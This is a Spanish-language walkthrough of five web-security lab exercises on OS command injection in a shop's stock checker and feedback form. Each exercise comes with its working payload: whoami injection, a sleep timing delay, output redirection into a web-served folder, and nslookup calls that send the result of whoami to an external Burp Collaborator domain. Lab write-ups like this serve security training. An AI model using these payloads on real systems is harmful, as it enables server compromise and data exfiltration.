## Reto 1: Inyección de comandos del sistema operativo, caso simple

Este laboratorio contiene una vulnerabilidad de inyección de comandos del sistema operativo en el verificador de stock de productos.

La aplicación ejecuta un comando de shell que contiene los identificadores de productos y tiendas proporcionados por el usuario y devuelve el resultado sin procesar del comando en su respuesta.

Para resolver el laboratorio, ejecute el whoamiComando para determinar el nombre del usuario actual. 


vulnerabilidad de inyección de comandos del sistema operativo en el verificador de stock. Al modificar el parámetro ‘storeID’ con ‘1|whoami‘, logramos que el servidor ejecute el comando ‘whoami‘, revelando así el usuario actual del sistema.

```
POST /product/stock HTTP/2
Host: 0a5400e00438941d80e7716d00c9002a.web-security-academy.net
Cookie: session=8ja1BH67dvla1YXqKpNHYgnjmDfHmgRR
Content-Length: 30
Sec-Ch-Ua: 
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a5400e00438941d80e7716d00c9002a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a5400e00438941d80e7716d00c9002a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

productId=1&storeId=1; whoami;
```

## Reto 2: Inyección ciega de comandos del sistema operativo con retrasos de tiempo

Este laboratorio contiene una vulnerabilidad de inyección de comandos ciegos del sistema operativo en la función de retroalimentación.

La aplicación ejecuta un comando de shell que contiene los datos proporcionados por el usuario. La salida del comando no se devuelve en la respuesta.

Para resolver el laboratorio, explote la vulnerabilidad de inyección de comandos ciegos del sistema operativo para provocar un retraso de 10 segundos. 

una inyección de comandos del sistema operativo en modalidad ciega, usando la función de feedback de la aplicación. Aunque el resultado del comando no se muestra en la respuesta, conseguimos demostrar su ejecución provocando una pausa intencionada.

Al inyectar `sleep(10)` en el parámetro ‘email‘, el servidor ejecuta el comando y genera un retardo de 10 segundos, lo que confirma la vulnerabilidad.

```
csrf=hCw2SmFjBQu1AAh8tUe4DzWbheIrqurV&name=test&email=test@test.com;sleep 10; &subject=afasdf&message=asdfasd
```

## Reto 3:Inyección ciega de comandos del sistema operativo con redirección de salida

Este laboratorio contiene una vulnerabilidad de inyección de comandos ciegos del sistema operativo en la función de retroalimentación.

La aplicación ejecuta un comando de shell que contiene los datos proporcionados por el usuario. La salida del comando no se devuelve en la respuesta. Sin embargo, puede usar la redirección de salida para capturar la salida del comando. Hay una carpeta con permisos de escritura en:
/var/www/images/

La aplicación sirve las imágenes del catálogo de productos desde esta ubicación. Puede redirigir la salida del comando inyectado a un archivo en esta carpeta y luego usar la URL de carga de la imagen para recuperar el contenido del archivo.

Para resolver el laboratorio, ejecute el whoamicomando y recuperar la salida. 

Aprovechamos que el directorio ‘/var/www/images/‘ es escribible, inyectando el comando ‘whoami‘ y redirigiendo su salida a un archivo dentro de esa carpeta (output.txt).

Luego accedemos a ese archivo a través del sistema de carga de imágenes, logrando visualizar el resultado del comando ejecutado en el servidor.

```
csrf=EI53BjEDDInZex7QqNGan3PzJ7bE0xCb&name=test&email=carlos@cambiado.com;whoami > /var/www/images/test.txt;&subject=afasdf&message=afasdfasdfa
```

## Reto 4: Inyección ciega de comandos del sistema operativo con interacción fuera de banda


Este laboratorio contiene una vulnerabilidad de inyección de comandos ciegos del sistema operativo en la función de retroalimentación.

La aplicación ejecuta un comando de shell que contiene la información proporcionada por el usuario. El comando se ejecuta de forma asíncrona y no afecta la respuesta de la aplicación. No es posible redirigir la salida a una ubicación accesible. Sin embargo, se pueden activar interacciones fuera de banda con un dominio externo.

Para resolver el laboratorio, explote la vulnerabilidad de inyección de comandos ciegos del sistema operativo para emitir una búsqueda DNS a Burp Collaborator. 

abordamos una inyección de comandos ciega en la que no obtenemos ninguna respuesta visible ni podemos redirigir la salida. Para comprobar la ejecución del comando, usamos una técnica fuera de banda (OAST) enviando una consulta DNS hacia un subdominio de Burp Collaborator.

```
csrf=B0jIrj5VjuPE7aI2DGyECMLk9syNJMil&name=test&email=test%40test.com;nslookup x.a0bvl5hbnm50i3m6ss4tx82m0d64uuij.oastify.com ;&subject=afasdf&message=asdfadfasdf
```

## Reto 5: Inyección ciega de comandos del sistema operativo con exfiltración de datos fuera de banda

Este laboratorio contiene una vulnerabilidad de inyección de comandos ciegos del sistema operativo en la función de retroalimentación.

La aplicación ejecuta un comando de shell que contiene la información proporcionada por el usuario. El comando se ejecuta de forma asíncrona y no afecta la respuesta de la aplicación. No es posible redirigir la salida a una ubicación accesible. Sin embargo, se pueden activar interacciones fuera de banda con un dominio externo.

Para resolver el laboratorio, ejecute el whoamiComando y exfiltrar la salida mediante una consulta DNS a Burp Collaborator. Deberá ingresar el nombre del usuario actual para completar el laboratorio. 

Una inyección de comandos ciega aprovechando una técnica avanzada de exfiltración de datos mediante consultas DNS a un dominio controlado. Usamos Burp Collaborator para lanzar un ‘whoami‘ y capturar el resultado directamente en el subdominio generado, demostrando cómo extraer información sensible incluso cuando no hay salida directa del comando.

```
csrf=zf4btby0GytYneIS7bK30CWwifOBprk0&name=test&email=test@test.com;nslookup $(whoami).457pqzm5sgaunxr0xm9n227g57byzpne.oastify.com;&subject=afasdf&message=asdfasdfa
```
